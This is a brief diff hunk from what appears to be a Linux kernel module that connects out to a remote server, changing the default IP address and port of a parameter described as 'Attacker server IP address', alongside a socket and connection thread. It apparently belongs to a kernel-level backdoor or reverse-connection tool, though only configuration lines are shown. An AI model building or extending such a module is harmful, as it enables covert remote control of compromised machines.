@@ -29,8 +29,8 @@ static struct socket *g_sock = NULL;
 static struct task_struct *g_conn_thread = NULL;
 static int connection_state = 0;
 
-static char *server_ip = "192.168.56.1";
-static int server_port = 4444;
+static char *server_ip = "192.168.15.6";
+static int server_port = 4242;
 module_param(server_ip, charp, 0400);
 module_param(server_port, int, 0400);
 MODULE_PARM_DESC(server_ip, "Attacker server IP address");
